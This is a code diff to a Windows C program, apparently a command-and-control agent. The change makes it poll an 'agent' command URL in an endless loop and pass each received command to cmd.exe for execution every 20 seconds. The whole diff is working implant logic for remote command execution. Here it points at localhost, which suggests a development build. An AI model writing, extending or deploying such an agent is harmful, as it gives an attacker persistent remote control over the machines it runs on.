@@ -54,47 +54,50 @@ int main() {
 	swprintf(CommandUrl, 256, L"http://127.0.0.1:5000/agent/%S/command", request_output);
 	wprintf(L"URL: %s\n", CommandUrl);
 	char command[256];
-	SendRequest(CommandUrl, command);
-	wchar_t no_command_set[256] = L"No command set";
-	if (wcscmp(command, no_command_set) == 0) {
-		printf("Recieved no command");
-	} else {
-		printf("Recieved Command: %s\n", command);
-	}
+	while (TRUE) {
+		memset(command, 0, sizeof(command));
+		SendRequest(CommandUrl, command);
+		char no_command_set[] = "No command set";
+		if (strcmp(command, no_command_set) == 0) {
+			printf("Recieved no command\n");
+		}
+		else {
+			printf("Recieved Command: %s\n", command);
+
+			wchar_t Process_Name[256];
+			swprintf(Process_Name, 256, L"/c %S", command);
+
+			STARTUPINFOW			SiW = { 0 };
+			PROCESS_INFORMATION		Pi = { 0 };
+
+			SiW.cb = sizeof(STARTUPINFOEXA);
+
+			if (!CreateProcessW(
+				L"C:\\Windows\\System32\\cmd.exe",
+				Process_Name,
+				NULL,
+				NULL,
+				FALSE,
+				0,
+				NULL,
+				NULL,
+				&SiW,
+				&Pi)) {
+				printf("[!] CreateProcessW Failed with Error : %d \n", GetLastError());
+			}
+
+			else {
+				printf("Process created\n");
 
 
-	wchar_t Process_Name[256];
-	swprintf(Process_Name, 256, L"C:\\Windows\\System32\\cmd.exe /c %s", command);
-	wprintf(Process_Name);
-
-	STARTUPINFOW			SiW = {0};
-	PROCESS_INFORMATION		Pi = { 0 };
-
-	SiW.cb = sizeof(STARTUPINFOEXA);
-
-	if (!CreateProcessW(
-		L"C:\\Windows\\system32\\cmd.exe",
-		NULL,
-		NULL,
-		NULL,
-		FALSE,
-		0,
-		NULL,
-		NULL,
-		&SiW,
-		&Pi)) {
-		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
-	}
-
-	else {
-		printf("Process created\n");
+				WaitForSingleObject(Pi.hProcess, INFINITE);
 
 
-		WaitForSingleObject(Pi.hProcess, INFINITE);
-
-
-		CloseHandle(Pi.hProcess);
-		CloseHandle(Pi.hThread);
+				CloseHandle(Pi.hProcess);
+				CloseHandle(Pi.hThread);
+			}
+		}
+		Sleep(20 * 1000);
 	}
 	return 0;
 }
